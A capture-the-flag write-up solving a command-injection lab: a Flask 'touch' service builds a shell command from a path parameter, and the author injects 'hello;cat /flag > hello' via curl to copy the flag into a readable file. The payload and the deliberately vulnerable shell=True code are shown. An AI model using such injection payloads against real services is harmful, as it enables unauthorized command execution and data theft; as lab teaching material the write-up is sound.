# Command Injection 5

Like the previous challenge, we get a `/challenge/server` that runs a command using `subprocess.run()`. This time, the server will not return the output of our
command in the html response, like it has been doing.

```python
def challenge():
    ...
    return f"""
            <html><body>
            Welcome to the touch service! Please choose a file to touch:
            <form action="/dare"><input type=text name=path><input type=submit value=Submit></form>
            <hr>
            <b>Ran {command}!</b><br>
            </body></html>
            """
```

The `arg` variable we control gets injected into `command` like so:

```python
@app.route("/dare", methods=["GET"])
def challenge():
    arg = flask.request.args.get("path", "/challenge/PWN")
    command = f"touch {arg}"

    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout
```

`touch` is a big hint here. Since the output is not given to us, another way to store the information of the flag is to use a file. Since we already have
the `touch` command, we can just touch a new file and then pipe the output of `cat /flag` into that file. Then, we can read the file after.

```bash
touch hello; cat /flag > hello
           ^ start of arg
```

This is what the payload looks like:

```bash
curl "challenge.localhost:80/dare?path=hello;cat%20/flag%20>%20hello"
```

After this, `hello` will be at our CWD. `cat` this file and we have our flag!